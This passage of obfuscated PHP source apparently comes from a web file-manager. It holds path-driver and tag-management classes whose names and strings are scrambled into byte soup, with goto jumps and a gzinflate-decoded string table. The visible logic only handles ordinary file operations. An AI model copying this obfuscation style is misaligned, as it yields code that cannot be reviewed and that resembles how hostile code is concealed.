…éó·[$Í’Ü¡½‡[446]], $Í’Ü¡½‡[487]); $ÕÜÌ¦çÒ = array_to_keyvalue($‹ …éó·[$Í’Ü¡½‡[598]], $Í’Ü¡½‡[487]); $›êóÆ† = $this->listData($®µú£µ); $¶Ó¥â× = array(); foreach ($ìğ‚ƒÕ… as $¯˜âÈ–æ) { $¦âÉÃ‰ = $¥ôó•[$¯˜âÈ–æ]; $şÚÚ¾È = _get($¦âÉÃ‰, $Í’Ü¡½‡[598]); if (!$¦âÉÃ‰ || !$şÚÚ¾È || !$ÕÜÌ¦çÒ[$şÚÚ¾È]) { continue; } if (!$¶Ó¥â×[$şÚÚ¾È]) { $¶Ó¥â×[$şÚÚ¾È] = array(); } $¶Ó¥â×[$şÚÚ¾È][] = $¯˜âÈ–æ; } $‚…«¾Ï = array(); $±¿ã—åè = array(); foreach ($›êóÆ† as $ê™–‡ä¡) { $ŞÈ·˜•Î = $ê™–‡ä¡[$Í’Ü¡½‡[87]]; $¦âÉÃ‰ = $¥ôó•[$ê™–‡ä¡[$Í’Ü¡½‡[515]]]; $şÚÚ¾È = _get($¦âÉÃ‰, $Í’Ü¡½‡[598]); if (!$¦âÉÃ‰ || !$şÚÚ¾È || !$¶Ó¥â×[$şÚÚ¾È] || !$ŞÈ·˜•Î) { continue; } if (!in_array($ê™–‡ä¡[$Í’Ü¡½‡[515]], $¶Ó¥â×[$şÚÚ¾È])) { continue; } if (!$‚…«¾Ï[$ŞÈ·˜•Î]) { $‚…«¾Ï[$ŞÈ·˜•Î] = array(); } $‚…«¾Ï[$ŞÈ·˜•Î][] = $şÚÚ¾È; } foreach ($‚…«¾Ï as $ŞÈ·˜•Î => $½ŒÍ±¹ê) { if (count($½ŒÍ±¹ê) != count($¶Ó¥â×)) { continue; } $±¿ã—åè[] = $ŞÈ·˜•Î; } if (!$ìğ‚ƒÕ…) { $±¿ã—åè = array_to_keyvalue($›êóÆ†, $Í’Ü¡½‡[12], $Í’Ü¡½‡[87]); } $±¿ã—åè = array_unique($±¿ã—åè); if (!$±¿ã—åè) { return array(); } $¢¸ó“Ïƒ = array($Í’Ü¡½‡[506] => array($Í’Ü¡½‡[507], $±¿ã—åè), $Í’Ü¡½‡[589] => $®µú£µ, $Í’Ü¡½‡[188] => SourceModel::TYPE_GROUP); $›ğ³î‹¢ = Model($Í’Ü¡½‡[1533])->listSource($¢¸ó“Ïƒ); if (!$›ğ³î‹¢ || count($±¿ã—åè) == $›ğ³î‹¢[$Í’Ü¡½‡[443]][$Í’Ü¡½‡[444]]) { return $›ğ³î‹¢; } $ä˜´ø°ş = array(); $î‰¦´ƒ = array_to_keyvalue($›ğ³î‹¢[$Í’Ü¡½‡[85]], $Í’Ü¡½‡[12], $Í’Ü¡½‡[191]); $şª½†Òå = array_to_keyvalue($›ğ³î‹¢[$Í’Ü¡½‡[86]], $Í’Ü¡½‡[12], $Í’Ü¡½‡[191]); $¾×«œâ = array_merge($şª½†Òå, $î‰¦´ƒ); foreach ($±¿ã—åè as $ŞÈ·˜•Î) { if (!in_array($ŞÈ·˜•Î, $¾×«œâ)) { $ä˜´ø°ş[] = $ŞÈ·˜•Î; } } if ($ä˜´ø°ş) { $this->removeBySource($®µú£µ, $ä˜´ø°ş); } return $›ğ³î‹¢; } protected function addToTag($¨¿ÑÓŠ¶, $ñ¯ê¸Ö×, $Ç­”­š) { $‹ƒş¤İ€ =& $_SERVER[©—Ò»ÅĞ]; if (!$this->getByTagID($¨¿ÑÓŠ¶, $Ç­”­š) || !$ñ¯ê¸Ö×) { return !1; } if (!Model($‹ƒş¤İ€[933])->pathInfo($ñ¯ê¸Ö×)) { return !1; } $ÎÒ’äÑÃ = array($‹ƒş¤İ€[1969] => 0, $‹ƒş¤İ€[573] => $Ç­”­š, $‹ƒş¤İ€[510] => $ñ¯ê¸Ö×, $‹ƒş¤İ€[511] => $‹ƒş¤İ€[2304] . $¨¿ÑÓŠ¶, $‹ƒş¤İ€[509] => $‹ƒş¤İ€[12], $‹ƒş¤İ€[2187] => 0); if ($this->where($ÎÒ’äÑÃ)->find()) { return !1; } return $this->add($ÎÒ’äÑÃ); } protected function removeFromTag($Û¶úµÇ¹, $ğÃÈş, $ÉòÑíÚë) { $²½¹‚îÊ =& $_SERVER[©—Ò»ÅĞ]; if (!$this->getByTagID($Û¶úµÇ¹, $ÉòÑíÚë) || !$ğÃÈş) { return !1; } if (is_array($ğÃÈş)) { $ğÃÈş = array($²½¹‚îÊ[7], $ğÃÈş); } $¯ •–¤û = array($²½¹‚îÊ[1969] => 0, $²½¹‚îÊ[573] => $ÉòÑíÚë, $²½¹‚îÊ[511] => $²½¹‚îÊ[2304] . $Û¶úµÇ¹, $²½¹‚îÊ[510] => $ğÃÈş); return $this->where($¯ •–¤û)->delete(); } protected function removeByTag($˜ÍÙÖ, $¤–ÈÒ•™) { $ŸßÒ©¦ç =& $_SERVER[©—Ò»ÅĞ]; if (!$this->getByTagID($˜ÍÙÖ, $¤–ÈÒ•™)) { return !1; } $¿şÌ¤ÕÅ = array($ŸßÒ©¦ç[1969] => 0, $ŸßÒ©¦ç[573] => $¤–ÈÒ•™, $ŸßÒ©¦ç[511] => $ŸßÒ©¦ç[2304] . $˜ÍÙÖ); return $this->where($¿şÌ¤ÕÅ)->delete(); } protected function removeBySource($‹ö¢™ÛÊ, $Í´¿ìöÖ) { $íË¦“ =& $_SERVER[©—Ò»ÅĞ]; if (!$‹ö¢™ÛÊ || !$Í´¿ìöÖ) { return !1; } if (is_array($Í´¿ìöÖ)) { $Í´¿ìöÖ = array($íË¦“[7], $Í´¿ìöÖ); } $ÍŠşŠ„¤ = array($íË¦“[1969] => 0, $íË¦“[510] => $Í´¿ìöÖ, $íË¦“[573] => array($íË¦“[1182], 0), $íË¦“[511] => $íË¦“[2304] . $‹ö¢™ÛÊ); return $this->where($ÍŠşŠ„¤)->delete(); } } goto BÑ¬ó©ª; dŒ‰Ÿçìø·: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($®°õ³Œ¶) { if (substr($®°õ³Œ¶, 0, 2) == $_SERVER[©—Ò»ÅĞ][1523]) { $®°õ³Œ¶ = BASIC_PATH . substr($®°õ³Œ¶, 2); } return $®°õ³Œ¶; } public function iconvApp($ˆÜëä) { $×¿óŒØ´ =& $_SERVER[©—Ò»ÅĞ]; global $config; return $this->iconvTo($ˆÜëä, $config[$×¿óŒØ´[1647]], $config[$×¿óŒØ´[1646]]); } public function iconvSystem($ç¯«–È) { $¡ÆÆßÅû =& $_SERVER[©—Ò»ÅĞ]; global $config; return $this->iconvTo($ç¯«–È, $config[$¡ÆÆßÅû[1646]], $config[$¡ÆÆßÅû[1647]]); } public function getPathOuter($©ÚÅÕÖ) { $Ş†§÷õ  =& $_SERVER[©—Ò»ÅĞ]; $éËŠØŒ¹ = $this->iconvApp($this->pathBase); $©ÚÅÕÖ = $this->iconvApp($©ÚÅÕÖ); if (substr($éËŠØŒ¹, 0, 2) == $Ş†§÷õ [1523]) { $éËŠØŒ¹ = BASIC_PATH . substr($éËŠØŒ¹, 2); } if (substr($©ÚÅÕÖ, 0, 2) == $Ş†§÷õ [1523]) { $©ÚÅÕÖ = BASIC_PATH . substr($©ÚÅÕÖ, 2); } $éËŠØŒ¹ = KodIO::clear($éËŠØŒ¹); $©ÚÅÕÖ = KodIO::clear($©ÚÅÕÖ); $©ÚÅÕÖ = substr($©ÚÅÕÖ, strlen($éËŠØŒ¹)); if (empty($this->pathDriver)) { return $©ÚÅÕÖ; } return $this->pathDriver . $Ş†§÷õ [8] . ltrim($©ÚÅÕÖ, $Ş†§÷õ [8]); } public function mkfile($öÍ¼”Ò‹, $åô¢ôÉ = '', $®ŸùªËÏ = REPEAT_RENAME) { $öÍ¼”Ò‹ = $this->iconvSystem($öÍ¼”Ò‹); @touch($öÍ¼”Ò‹); if ($åô¢ôÉ) { file_put_contents($öÍ¼”Ò‹, $åô¢ôÉ); } @chmod($öÍ¼”Ò‹, $this->pathAuth); if (is_file($öÍ¼”Ò‹)) { return $this->getPathOuter($öÍ¼”Ò‹); } $this->writeLog(__FUNCTION__ . $_SERVER[©—Ò»ÅĞ][1658], !0); return !1; } public function mkdir($º³Òº„«, $Öšºâöı = REPEAT_SKIP) { $º³Òº„« = $this->iconvSystem($º³Òº„«); if (is_dir($º³Òº„«)) { return $this->getPathOuter($º³Òº„«); } @mkdir($º³Òº„«, $this->pathAuth, !0); @chmod($º³Òº„«, $this->pathAuth); if (is_dir($º³Òº„«)) { return $this->getPathOuter($º³Òº„«); } $this->writeLog(__FUNCTION__ . $_SERVER[©—Ò»ÅĞ][1658], !0); return !1; } public function copyFile($Ôˆ‹¢“, $šƒºÕóñ) { $this->mkdir($this->pathFather($šƒºÕóñ)); $Ôˆ‹¢“ = $this->iconvSystem($Ôˆ‹¢“); $šƒºÕóñ = $this->iconvSystem($šƒºÕóñ); $ºíÔºñó = copy_64($Ôˆ‹¢“, $šƒºÕóñ); @chmod($šƒºÕóñ, $this->pathAuth); if ($ºíÔºñó) { return $this->getPathOuter($šƒºÕóñ); } $this->writeLog(__FUNCTION__ . $_SERVER[©—Ò»ÅĞ][1658], !0); return !1; } public function moveFile($”ÀıÎù, $¼ì«´˜¯) { $this->mkdir($this->pathFather($¼ì«´˜¯)); $”ÀıÎù = $this->iconvSystem($”ÀıÎù); $¼ì«´˜¯ = $this->iconvSystem($¼ì«´˜¯); $ó®ÒÈäÁ = intval(@rename($”ÀıÎù, $¼ì«´˜¯)); if (!$ó®ÒÈäÁ) { if ($ó®ÒÈäÁ = intval(@copy_64($”ÀıÎù, $¼ì«´˜¯))) { @unlink($”ÀıÎù); } } @chmod($¼ì«´˜¯, $this->pathAuth); if ($ó®ÒÈäÁ) { return $this->getPathOuter($¼ì«´˜¯); } $this->writeLog(__FUNCTION__ . $_SERVER[©—Ò»ÅĞ][1658], !0); return !1; } public function movePath($º©Æ™·, $–ãìà„Ã, $ËÈ³±¿Ï = false) { $ƒ×ññäÈ =& $_SERVER[©—Ò»ÅĞ]; $º©Æ™· = $this->iconvSystem($º©Æ™·); $–ãìà„Ã = $this->iconvSystem($–ãìà„Ã); $ºû›şòÓ = rtrim($–ãìà„Ã, $ƒ×ññäÈ[8]) . $ƒ×ññäÈ[8] . ($ËÈ³±¿Ï ? $ËÈ³±¿Ï : get_path_this($º©Æ™·)); if (file_exists($ºû›şòÓ)) { return !1; } $¬Òı†€¬ = intval(@rename($º©Æ™·, $ºû›şòÓ)); $¬Òı†€¬ = file_exists($ºû›şòÓ); if ($¬Òı†€¬) { return $this->getPathOuter($ºû›şòÓ); } $this->writeLog(__FUNCTION__ . $ƒ×ññäÈ[1658], !0); return !1; } public function delFile($•´ø€¸­) { $•´ø€¸­ = $this->iconvSystem($•´ø€¸­); if (!@unlink($•´ø€¸­)) { @chmod($•´ø€¸­, $this->pathAuth); if (@unlink($•´ø€¸­)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[©—Ò»ÅĞ][1658], !0); return !1; } return !0; } public function delFolder($œŒ¬Íı½) { $Û¿š® =& $_SERVER[©—Ò»ÅĞ]; $œŒ¬Íı½ = $this->iconvSystem($œŒ¬Íı½); if (!is_dir($œŒ¬Íı½)) { return !0; } if (!($´›Àê = opendir($œŒ¬Íı½))) { return !1; } while (($ı– ­ = readdir($´›Àê)) !== !1) { if ($ı– ­ == $Û¿š®[10] || $ı– ­ == $Û¿š®[1468]) { continue; } $Ş°”õ = $œŒ¬Íı½ . $Û¿š®[8] . $ı– ­; if (is_file($Ş°”õ) || is_link($Ş°”õ)) { if (!unlink($Ş°”õ)) { chmod($Ş°”õ, $this->pathAuth); if (!unlink($Ş°”õ)) { return !1; } } } else { if (is_dir($Ş°”õ)) { chmod($Ş°”õ, $this->pathAuth); $Ş°”õ = $this->iconvApp($Ş°”õ); if (!$this->delFolder($Ş°”õ)) { return !1; } } } } closedir($´›Àê); return rmdir($œŒ¬Íı½); } public function rename($À³ê×”, $Á„˜Í”´) { $ò‡ÚªáÔ =& $_SERVER[©—Ò»ÅĞ]; $ùë¾Ãõ = $this->fileNameAuto($this->pathFather($À³ê×”), $Á„˜Í”´); $ùë¾Ãõ = $this->iconvSystem($ùë¾Ãõ); $À³ê×” = $this->iconvSystem($À³ê×”); $¸‰Ñ¡Îù = $this->pathFather($À³ê×”); $ÏæÚ¥¾ = rtrim($¸‰Ñ¡Îù, $ò‡ÚªáÔ[8]) . $ò‡ÚªáÔ[8] . $ùë¾Ãõ; $Œ­š¹ìµ = @rename($À³ê×”, $ÏæÚ¥¾); $ÏæÚ¥¾ = $this->iconvApp($ÏæÚ¥¾); if ($Œ­š¹ìµ) { return $this->getPathOuter($ÏæÚ¥¾); } $this->writeLog(__FUNCTION__ . $ò‡ÚªáÔ[1658], !0); return !1; } public function size($¿”‡óœ•) { $¿”‡óœ• = $this->iconvSystem($¿”‡óœ•); return filesize_64($¿”‡óœ•); } public function info($Ÿİ ŒÓ) { $Ÿİ ŒÓ = $this->iconvSystem($Ÿİ ŒÓ); if ($this->isFolder($Ÿİ ŒÓ)) { return $this->folderInfo($Ÿİ ŒÓ); } else { if ($this->isFile($Ÿİ ŒÓ)) { return $this->fileInfo($Ÿİ ŒÓ); } } return !1; } protected function infoChildren($³éòßê, &$œõÚöå, $ÕÊ£ì›ı = true) { $üœó¥± =& $_SERVER[©—Ò»ÅĞ]; check_abort_echo(); $³éòßê = rtrim($³éòßê, $üœó¥±[8]) . $üœó¥±[8]; if ($ÕÊ£ì›ı) { $³éòßê = $this->iconvSystem($³éòßê); } if (!($¾ÌçØá¡ = @opendir($³éòßê))) { return; } while (($¦Ù—ÖÚÀ = readdir($¾ÌçØá¡)) !== !1) { if ($¦Ù—ÖÚÀ == $üœó¥±[10] || $¦Ù—ÖÚÀ == $üœó¥±[1468]) { continue; } $ØÔºîéã = $³éòßê . $¦Ù—ÖÚÀ; if (is_file($ØÔºîéã) || is_link($ØÔºîéã)) { $œõÚöå[$üœó¥±[80]]++; $œõÚöå[$üœó¥±[79]] += filesize_64($ØÔºîéã); } else { if (is_dir($ØÔºîéã)) { $œõÚöå[$üœó¥±[81]]++; $this->infoChildren($ØÔºîéã, $œõÚöå, !1); } } } closedir($¾ÌçØá¡); } private function folderInfo($ÁüÃèŸ¼, $¬Ã«Ÿòæ = false) { $¤¾Ë¯¥‘ =& $_SERVER[©—Ò»ÅĞ]; $ÁüÃèŸ¼ = rtrim($ÁüÃèŸ¼, $¤¾Ë¯¥‘[8]) . $¤¾Ë¯¥‘[8]; $€ÛæÖ™« = $this->iconvApp($this->pathThis($ÁüÃèŸ¼)); if ($¬Ã«Ÿòæ) { return array($¤¾Ë¯¥‘[32] => $€ÛæÖ™«, $¤¾Ë¯¥‘[87] => $this->getPathOuter($ÁüÃèŸ¼), $¤¾Ë¯¥‘[33] => $¤¾Ë¯¥‘[78]); } $±¥ø»Ø = array($¤¾Ë¯¥‘[32] => $€ÛæÖ™«, $¤¾Ë¯¥‘[87] => $this->getPathOuter($ÁüÃèŸ¼), $¤¾Ë¯¥‘[33] => $¤¾Ë¯¥‘[78], $¤¾Ë¯¥‘[231] => @filectime($ÁüÃèŸ¼), $¤¾Ë¯¥‘[88] => @filemtime($ÁüÃèŸ¼), $¤¾Ë¯¥‘[1662] => @fileatime($ÁüÃèŸ¼), $¤¾Ë¯¥‘[1663] => is_readable($ÁüÃèŸ¼), $¤¾Ë¯¥‘[1664] => is_writable($ÁüÃèŸ¼), $¤¾Ë¯¥‘[1665] => get_mode($ÁüÃèŸ¼)); return $±¥ø»Ø; } private function fileInfo($ÚØ´²Ü¬, $±ÑÑœğ‚ = false) { $˜‘Ïš®Å =& $_SERVER[©—Ò»ÅĞ]; $§Ú—Íïõ = $this->iconvApp($this->pathThis($ÚØ´²Ü¬)); if ($±ÑÑœğ‚) { return array($˜‘Ïš®Å[32] => $§Ú—Íïõ, $˜‘Ïš®Å[87] => $this->getPathOuter($ÚØ´²Ü¬), $˜‘Ïš®Å[33] => $˜‘Ïš®Å[230], $˜‘Ïš®Å[79] => $this->size($ÚØ´²Ü¬), $˜‘Ïš®Å[166] => $this->ext($§Ú—Íïõ)); } $ÑªèôŠ¤ = array($˜‘Ïš®Å[32] => $§Ú—Íïõ, $˜‘Ïš®Å[87] => $this->getPathOuter($ÚØ´²Ü¬), $˜‘Ïš®Å[33] => $˜‘Ïš®Å[230], $˜‘Ïš®Å[231] => @filectime($ÚØ´²Ü¬), $˜‘Ïš®Å[88] => @filemtime($ÚØ´²Ü¬), $˜‘Ïš®Å[1662] => @fileatime($ÚØ´²Ü¬), $˜‘Ïš®Å[79] => $this->size($ÚØ´²Ü¬), $˜‘Ïš®Å[166] => $this->ext($§Ú—Íïõ), $˜‘Ïš®Å[1663] => is_readable($ÚØ´²Ü¬), $˜‘Ïš®Å[1664] => is_writable($ÚØ´²Ü¬), $˜‘Ïš®Å[1665] => get_mode($ÚØ´²Ü¬)); return $ÑªèôŠ¤; } public function exist($‚áéüé) { $‚áéüé = $this->iconvSystem($‚áéüé); return @file_exists($‚áéüé); } public function isFile($µ¡ÈÖÙ) { $µ¡ÈÖÙ = $this->iconvSystem($µ¡ÈÖÙ); return @is_file($µ¡ÈÖÙ); } public function isFolder($À©İåéŠ) { $À©İåéŠ = $this->iconvSystem($À©İåéŠ); return @is_dir($À©İåéŠ); } public function listPath($÷«îúèï, $‘Òç¯å“ = false) { $Ù˜ÄçÅÏ =& $_SERVER[©—Ò»ÅĞ]; $÷«îúèï = $this->iconvSystem($÷«îúèï); $÷«îúèï = rtrim($÷«îúèï, $Ù˜ÄçÅÏ[8]) . $Ù˜ÄçÅÏ[8]; $˜öÊ’ø’ = array($Ù˜ÄçÅÏ[85] => array(), $Ù˜ÄçÅÏ[86] => array()); if (!($£Â½æµã = @opendir($÷«îúèï))) { return $˜öÊ’ø’; } while (($óÚ­î‰õ = readdir($£Â½æµã)) !== !1) { if ($óÚ­î‰õ == $Ù˜ÄçÅÏ[10] || $óÚ­î‰õ == $Ù˜ÄçÅÏ[1468]) { continue; } $ÄÕ€†ô¥ = $÷«îúèï . $óÚ­î‰õ; if (is_file($ÄÕ€†ô¥)) { $˜öÊ’ø’[$Ù˜ÄçÅÏ[86]][] = $this->fileInfo($ÄÕ€†ô¥, $‘Òç¯å“); } else { $˜öÊ’ø’[$Ù˜ÄçÅÏ[85]][] = $this->folderInfo($ÄÕ€†ô¥, $‘Òç¯å“); } } closedir($£Â½æµã); return $˜öÊ’ø’; } public function listAll($¬“Œ‘È³, &$àÓ“Ù–É = array()) { $€£à”°â =& $_SERVER[©—Ò»ÅĞ]; $¬“Œ‘È³ = $this->iconvSystem($¬“Œ‘È³); $¬“Œ‘È³ = rtrim($¬“Œ‘È³, $€£à”°â[8]) . $€£à”°â[8]; if (!($¿éì¥Ü  = @opendir($¬“Œ‘È³))) { return $àÓ“Ù–É; } while (($‡¶ÀŒ‡™ = readdir($¿éì¥Ü )) !== !1) { if ($‡¶ÀŒ‡™ == $€£à”°â[10] || $‡¶ÀŒ‡™ == $€£à”°â[1468]) { continue; } $˜Æˆî¤û = $¬“Œ‘È³ . $‡¶ÀŒ‡™; $áøóÚ‡» = is_dir($˜Æˆî¤û) && !is_link($˜Æˆî¤û) ? 1 : 0; $˜Æˆî¤û = $áøóÚ‡» ? $˜Æˆî¤û . $€£à”°â[8] : $˜Æˆî¤û; $àÓ“Ù–É[] = array($€£à”°â[87] => $this->getPathOuter($˜Æˆî¤û), $€£à”°â[78] => $áøóÚ‡», $€£à”°â[88] => intval(@filemtime($˜Æˆî¤û)), $€£à”°â[79] => $áøóÚ‡» ? 0 : intval($this->size($˜Æˆî¤û))); if ($áøóÚ‡») { $this->listAll($˜Æˆî¤û, $àÓ“Ù–É); } } closedir($¿éì¥Ü ); return $àÓ“Ù–É; } public function has($ÁØ¨¹»Ò, $‡ë²×ÕÒ = false, $ªÌõÆÃÎ = true) { $¥Ø‡ÍÙı =& $_SERVER[©—Ò»ÅĞ]; $ÁØ¨¹»Ò = $this->iconvSystem($ÁØ¨¹»Ò); $ÁØ¨¹»Ò = rtrim($ÁØ¨¹»Ò, $¥Ø‡ÍÙı[8]) . $¥Ø‡ÍÙı[8]; if (!($‚©©ÎšÆ = @opendir($ÁØ¨¹»Ò))) { return !1; } $ÉŠˆ°å = 0; $”õÑñ§Ò = 0; $›÷™¸”— = 0; while (($³ñÈ©êˆ = readdir($‚©©ÎšÆ)) !== !1) { if ($³ñÈ©êˆ == $¥Ø‡ÍÙı[10] || $³ñÈ©êˆ == $¥Ø‡ÍÙı[1468]) { continue; } $º¿ıåÏ = $ÁØ¨¹»Ò . $³ñÈ©êˆ; if ($‡ë²×ÕÒ) { $›÷™¸”—++; if (@is_file($º¿ıåÏ)) { $ÉŠˆ°å++; } else { $”õÑñ§Ò++; } if ($›÷™¸”— > 10000) { break; } continue; } if ($ªÌõÆÃÎ) { if (@is_file($º¿ıåÏ)) { return !0; } } else { if (@is_dir($º¿ıåÏ . $¥Ø‡ÍÙı[8])) { return !0; } } } closedir($‚©©ÎšÆ); if ($‡ë²×ÕÒ) { return array($¥Ø‡ÍÙı[239] => $ÉŠˆ°å, $¥Ø‡ÍÙı[240] => $”õÑñ§Ò); } return !1; } public function hashSimple($Àó£¯ØÄ) { $«ÎÙÏ¡ =& $_SERVER[©—Ò»ÅĞ]; if (!$Àó£¯ØÄ) { return md5($«ÎÙÏ¡[12]); } $Àó£¯ØÄ = $this->iconvSystem($Àó£¯ØÄ); $ğ¼Ş“— = $this->size($Àó£¯ØÄ); $ä·ãç‡Ä = 200; $®º‘ïŞö = 50; if ($ğ¼Ş“— <= $ä·ãç‡Ä * $®º‘ïŞö) { return $this->hashMd5($Àó£¯ØÄ) . $ğ¼Ş“—; } $à‰³šóö = $«ÎÙÏ¡[12]; $ƒÍİ„²´ = intval($ğ¼Ş“— / $®º‘ïŞö); $Ø÷–ß­ = fopen($Àó£¯ØÄ, $«ÎÙÏ¡[1666]); if (!$Ø÷–ß­) { return $à‰³šóö; } for ($ÜÕÉ™“Â = 0; $ÜÕÉ™“Â < $®º‘ïŞö; $ÜÕÉ™“Â++) { fseek_64($Ø÷–ß­, $ƒÍİ„²´ * $ÜÕÉ™“Â); $à‰³šóö .= fread($Ø÷–ß­, $ä·ãç‡Ä); } fseek_64($Ø÷–ß­, $ğ¼Ş“— - $ä·ãç‡Ä); $à‰³šóö .= fread($Ø÷–ß­, $ä·ãç‡Ä); fclose($Ø÷–ß­); return md5($à‰³šóö) . $ğ¼Ş“—; } public function getContent($­Ã‡‹³Ú) { $­Ã‡‹³Ú = $this->iconvSystem($­Ã‡‹³Ú); return file_get_contents($­Ã‡‹³Ú); } public function setContent($ñˆ«´¼, $‚é¡àİ™ = '') { $ñˆ«´¼ = $this->iconvSystem($ñˆ«´¼); $ËÂ„££ = @file_put_contents($ñˆ«´¼, $‚é¡àİ™, LOCK_EX); if (!$ËÂ„££) { $this->writeLog(__FUNCTION__ . $_SERVER[©—Ò»ÅĞ][1658], !0); } clearstatcache(); @chmod($ñˆ«´¼, $this->pathAuth); return $ËÂ„££ === !1 ? !1 : !0; } public function fileSubstr($ºó¾Ä§, $ûâ˜×àõ = 0, $ÑÓ¤Ÿ˜û = false) { $Ï¥•±ü =& $_SERVER[©—Ò»ÅĞ]; $ºó¾Ä§ = $this->iconvSystem($ºó¾Ä§); if ($ÑÓ¤Ÿ˜û === !1) { $ÑÓ¤Ÿ˜û = $this->size($ºó¾Ä§); } if ($ÑÓ¤Ÿ˜û <= 0) { return $Ï¥•±ü[12]; } $·í¶óÒ = fopen($ºó¾Ä§, $Ï¥•±ü[1666]); if (!$·í¶óÒ) { return !1; } fseek_64($·í¶óÒ, $ûâ˜×àõ); $²ËÙ éş = fread($·í¶óÒ, $ÑÓ¤Ÿ˜û); fclose($·í¶óÒ); if (!$²ËÙ éş) { $this->writeLog(__FUNCTION__ . $Ï¥•±ü[1658], !0); } return $²ËÙ éş; } public function upload($İ‘ÍóôŠ, $æ¬ŒŠ²Ï, $—«Š›éß = false, $ü£¿´à§ = REPEAT_REPLACE) { if (!$æ¬ŒŠ²Ï || !@file_exists($æ¬ŒŠ²Ï)) { return !1; } if ($—«Š›éß) { return $this->moveFile($æ¬ŒŠ²Ï, $İ‘ÍóôŠ); } return $this->copyFile($æ¬ŒŠ²Ï, $İ‘ÍóôŠ); } public function setModifyTime($³²ˆ­­È, $²¯õŠÛ’ = '') { @touch($³²ˆ­­È, intval($²¯õŠÛ’)); } public function download($€ÉÈ²úÅ, $¹”›ıˆ) { return $this->iconvSystem($€ÉÈ²úÅ); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($½ÍÊòü“) { parent::__construct($½ÍÊòü“); $this->setSignVersion($_SERVER[©—Ò»ÅĞ][247]); } public function fileOutImage($İá³™÷Ò, $Íİ§Ãí­ = 250) { $Ò€õº ó =& $_SERVER[©—Ò»ÅĞ]; if ($this->size($İá³™÷Ò) > 1024 * 1024 * 25) { return $this->fileOutImageServer($İá³™÷Ò, $Íİ§Ãí­); } $œ…œ‹ëÔ = array($Ò€õº ó[1667] => $Ò€õº ó[1668] . $Íİ§Ãí­ . $Ò€õº ó[1669]); $ÍÜÓ­¯™ = $this->link($İá³™÷Ò, $œ…œ‹ëÔ); $this->fileOutLink($ÍÜÓ­¯™); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ƒïİ¼ ï) { parent::__construct($ƒïİ¼ ï); $this->setSignVersion($_SERVER[©—Ò»ÅĞ][247]); } public function uploadFormData($÷ó›ÎÙÈ, $İÚÂıÆÙ = 3600) { return $this->uploadFormDataV2($÷ó›ÎÙÈ, $İÚÂıÆÙ); } } goto b±¸ìêœ; aãµ’‰¸àå: while ($nfxdtkclqw < $_SERVER[©—Ò»ÅĞ][702]) { if ($nfxdtkclqw >= 0) { break; } $nfxdtkclqw++; } $_SERVER[ñâÍÚ°] = explode($_SERVER[©—Ò»ÅĞ][703], gzinflate(substr($_SERVER[©—Ò»ÅĞ][704], 10, -8))); $eajrzxqckm = $_SERVER[©—Ò»ÅĞ][705]; goto b•İÛßìÎä; E×ÕˆéŠ¿Ë: class PathDriverDbShareItem extends PathDriverDB { public function __construct($ÉÓ“ğ¾ê) { $this->pathParse = $ÉÓ“ğ¾ê; $this->model = Model($_SERVER[©—Ò»ÅĞ][1533]); } public function getPathRoot() { $éñß…» =& $_SERVER[©—Ò»ÅĞ]; return KodIO::makeShare($this->pathParse[$éñß…»[487]], $this->pathParse[$éñß…»[1360]]); } public function getPathOuter($…ÀÜñè) { $Æõœ™ÓÏ =& $_SERVER[©—Ò»ÅĞ]; if (!$…ÀÜñè) { return $…ÀÜñè; } $ÃÆõ®Ê¨ = $this->parse($…ÀÜñè); return trim(KodIO::makeShare($this->pathParse[$Æõœ™ÓÏ[487]], $ÃÆõ®Ê¨[$Æõœ™ÓÏ[487]]), $Æõœ™ÓÏ[8]); } public function isParentOf($Íˆ’¡Å—, $îÚ™¦Ã») { $¬ìèÊòé = IO::init($îÚ™¦Ã»); return $this->model->isParentOf($Íˆ’¡Å—, $¬ìèÊòé->path); } protected function infoParse($ÄºÚÅø’, $Û±ãÚÀ = false, $¿Ì€ƒÄé = false) { $‚‚ı¢ôø =& $_SERVER[©—Ò»ÅĞ]; static $ÇŞ›ÆÊÖ = array(); $Æı’òì = $this->pathParse[$‚‚ı¢ôø[487]]; $êî’ßŞø = trim($this->pathParse[$‚‚ı¢ôø[1356]], $‚‚ı¢ôø[8]); if (isset($ÇŞ›ÆÊÖ[$êî’ßŞø]) && is_array($ÇŞ›ÆÊÖ[$êî’ßŞø])) { return $ÇŞ›ÆÊÖ[$êî’ßŞø]; } $ìº°¡­á = Action($‚‚ı¢ôø[1540])->sharePathInfo($Æı’òì, $êî’ßŞø, $Û±ãÚÀ); $ÇŞ›ÆÊÖ[$êî’ßŞø] = $ìº°¡­á; return $ìº°¡­á; } public function infoFull($¾ÜÍ¸İ´) { $øœîÕ =& $_SERVER[©—Ò»ÅĞ]; $û±­–›ä = explode($øœîÕ[8], trim($¾ÜÍ¸İ´, $øœîÕ[8])); if (count($û±­–›ä) > 1) { $‡÷ü« = implode($øœîÕ[8], array_splice($û±­–›ä, 1)); $ó›€¡ÖÛ = $this->model->pathInfoByPath($û±­–›ä[0], $‡÷ü«); if (!$ó›€¡ÖÛ) { return !1; } $this->pathParse[$øœîÕ[1356]] = $ó›€¡ÖÛ[$øœîÕ[191]]; } return $this->infoParse($¾ÜÍ¸İ´); } public function listAll($Şßã»„­) { $Öò ÈëÒ =& $_SERVER[©—Ò»ÅĞ]; $…®²ü¿ = IO::info($this->pathParse[$Öò ÈëÒ[87]]); if (!$…®²ü¿) { return array(); } $Š÷“ àæ = $this->model->listAll($Şßã»„­); $±“ òˆ = Model($Öò ÈëÒ[686])->getInfo($…®²ü¿[$Öò ÈëÒ[687]]); foreach ($Š÷“ àæ as &$¥³¨‡ı½) { check_abort(); $¥³¨‡ı½[$Öò ÈëÒ[90]] = Action($Öò ÈëÒ[1540])->_shareItemeParse($¥³¨‡ı½[$Öò ÈëÒ[90]], $±“ òˆ); } unset($¥³¨‡ı½); return $Š÷“ àæ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($¦“•£Şş) { $this->pathParse = $¦“•£Şş; $this->model = Model($_SERVER[©—Ò»ÅĞ][1533]); } protected function infoParse($í§Á…À, $´‰ä¶ = false, $ø¾âØŠ = false) { $˜Ô«Ëûá =& $_SERVER[©—Ò»ÅĞ]; return 